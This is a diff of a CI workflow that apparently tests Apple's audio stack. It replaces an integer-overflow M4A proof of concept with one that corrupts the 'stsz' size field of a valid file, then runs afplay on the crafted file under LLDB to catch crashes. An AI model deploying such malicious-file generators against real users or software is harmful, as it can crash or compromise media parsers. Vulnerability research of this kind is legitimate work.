@@ -19,61 +19,78 @@ jobs:
       - name: Navigate to working directory
         run: cd AppleTest/apple-positional-audio-codec-invalid-header-main && ls -l
 
-      # Updated: Patch encodeme.mm to attempt an integer overflow.
-      - name: Patch encodeme.mm to generate an integer-overflow M4A
+      # Updated: Patch encodeme.mm to manually corrupt a valid M4A file.
+      - name: Patch encodeme.mm to manually corrupt a valid file
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Patching encodeme.mm to generate a file designed to cause an integer overflow..."
+          echo "Patching encodeme.mm to generate and then corrupt a valid M4A file..."
           cat > encodeme.mm << 'EOF'
           #import <Foundation/Foundation.h>
           #import <AudioToolbox/AudioToolbox.h>
+
+          // Helper function to write a valid, short M4A file
+          bool createValidM4A(const char* path) {
+              NSString *fileName = [NSString stringWithUTF8String:path];
+              CFURLRef fileURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, (CFStringRef)fileName, kCFURLPOSIXPathStyle, false);
+
+              AudioStreamBasicDescription asbd = {0};
+              asbd.mSampleRate = 44100;
+              asbd.mFormatID = kAudioFormatMPEG4AAC;
+              asbd.mFramesPerPacket = 1024;
+              asbd.mChannelsPerFrame = 1;
+
+              AudioFileID audioFile;
+              OSStatus status = AudioFileCreateWithURL(fileURL, kAudioFileM4AType, &asbd, kAudioFileFlags_EraseFile, &audioFile);
+              if (status != noErr) return false;
+
+              // Write a few packets of silent data
+              UInt32 numPacketsToWrite = 5;
+              char dummy_data[256] = {0};
+              AudioStreamPacketDescription packetDesc = {0};
+              packetDesc.mDataByteSize = sizeof(dummy_data);
+
+              status = AudioFileWritePackets(audioFile, false, sizeof(dummy_data) * numPacketsToWrite, &packetDesc, 0, &numPacketsToWrite, dummy_data);
+              
+              AudioFileClose(audioFile);
+              CFRelease(fileURL);
+              return status == noErr;
+          }
 
           int main(int argc, const char * argv[]) {
               @autoreleasepool {
                   time_t startTime = time(NULL);
                   fprintf(stderr, "Starting encodeme at %s", ctime(&startTime));
 
-                  NSString *fileName = @"output_integer_overflow.m4a";
-                  CFURLRef fileURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, (CFStringRef)fileName, kCFURLPOSIXPathStyle, false);
+                  const char* fileName = "output_manual_corruption.m4a";
 
-                  AudioStreamBasicDescription asbd = {0};
-                  asbd.mSampleRate = 44100;
-                  asbd.mFormatID = kAudioFormatMPEG4AAC;
-                  asbd.mFramesPerPacket = 1024;
-                  asbd.mChannelsPerFrame = 1;
+                  // Step 1: Create a valid M4A file.
+                  if (!createValidM4A(fileName)) {
+                      fprintf(stderr, "Failed to create a valid base M4A file.\n");
+                      return 1;
+                  }
+                  fprintf(stderr, "Successfully created a valid M4A file.\n");
 
-                  AudioFileID audioFile;
-                  OSStatus status = AudioFileCreateWithURL(fileURL, kAudioFileM4AType, &asbd, kAudioFileFlags_EraseFile, &audioFile);
-                  if (status != noErr) {
-                      fprintf(stderr, "AudioFileCreateWithURL failed\n");
+                  // Step 2: Re-open the file and manually corrupt a header field.
+                  FILE *file = fopen(fileName, "r+b"); // Open for binary read/write
+                  if (!file) {
+                      fprintf(stderr, "Failed to re-open the M4A file for corruption.\n");
                       return 1;
                   }
 
-                  // PoC: Integer Overflow Attempt
-                  // We describe a packet with a massive data size, close to UINT32_MAX.
-                  // The goal is that a parser might try to add this size to a buffer offset,
-                  // causing an integer overflow, which results in a small, incorrect offset
-                  // and a potential crash when writing data.
-                  AudioStreamPacketDescription packetDesc;
-                  packetDesc.mStartOffset = 0;
-                  packetDesc.mVariableFramesInPacket = 1024;
-                  packetDesc.mDataByteSize = 0xFFFFFFF0; // Maliciously large size
-
-                  char dummy_data[128] = {0}; // A small amount of actual data
+                  // PoC: Manual Corruption
+                  // We seek to a known offset and overwrite a size atom.
+                  // The 'stsz' atom (Sample Size Box) is a good target. A standard M4A created
+                  // by this code will have it around offset 0x98. We will overwrite its size
+                  // field to be massive.
+                  fseek(file, 0x98, SEEK_SET);
                   
-                  // Fixed: The 6th argument to AudioFileWritePackets must be a pointer to a UInt32.
-                  UInt32 numPacketsToWrite = 1;
+                  // This value (0x7FFFFFFF) will be written as a 32-bit big-endian integer.
+                  unsigned char malicious_size[4] = {0x7F, 0xFF, 0xFF, 0xFF};
+                  
+                  fwrite(malicious_size, 1, sizeof(malicious_size), file);
+                  fclose(file);
 
-                  // Write the packet description with the huge size, but the actual data is small.
-                  status = AudioFileWritePackets(audioFile, false, sizeof(dummy_data), &packetDesc, 0, &numPacketsToWrite, dummy_data);
-                  if (status != noErr) {
-                      fprintf(stderr, "AudioFileWritePackets failed with status: %d\n", status);
-                  }
-
-                  AudioFileClose(audioFile);
-                  CFRelease(fileURL);
-
-                  fprintf(stderr, "PoC: Wrote a file designed to trigger an integer overflow.\n");
+                  fprintf(stderr, "PoC: Manually corrupted the 'stsz' atom in the M4A file.\n");
                   time_t endTime = time(NULL);
                   fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
               }
@@ -100,15 +117,15 @@ jobs:
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
           ./encodeme_debug
-          echo "File 'output_integer_overflow.m4a' generated."
-          ls -l output_integer_overflow.m4a
+          echo "File 'output_manual_corruption.m4a' generated."
+          ls -l output_manual_corruption.m4a
           
       # Launch the player directly under LLDB to catch any startup crashes
       - name: Launch Player Under LLDB to Catch Startup Crashes
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
           PLAYER_LOG_FILE="player_debug_log.txt"
-          echo "--- Debugging Audio Player (afplay) with integer overflow file ---" > $PLAYER_LOG_FILE
+          echo "--- Debugging Audio Player (afplay) with manually corrupted file ---" > $PLAYER_LOG_FILE
           echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE
 
           echo "Creating LLDB script to launch and monitor afplay..."
@@ -123,7 +140,7 @@ jobs:
           echo "Launching afplay under LLDB to detect any startup crash..." >> $PLAYER_LOG_FILE
           # Execute afplay with the invalid file as an argument, under the control of the LLDB script.
           # We add '|| true' because afplay might exit with an error, which we expect.
-          lldb -s player_debug_script.lldb -- afplay output_integer_overflow.m4a >> $PLAYER_LOG_FILE 2>&1 || true
+          lldb -s player_debug_script.lldb -- afplay output_manual_corruption.m4a >> $PLAYER_LOG_FILE 2>&1 || true
 
           echo "✅ Player debug log created. Displaying contents:"
           cat $PLAYER_LOG_FILE
@@ -134,7 +151,7 @@ jobs:
         with:
           name: audio-and-debug-artifacts
           path: |
-            AppleTest/apple-positional-audio-codec-invalid-header-main/output_integer_overflow.m4a
+            AppleTest/apple-positional-audio-codec-invalid-header-main/output_manual_corruption.m4a
             AppleTest/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
           retention-days: 7
           if-no-files-found: error
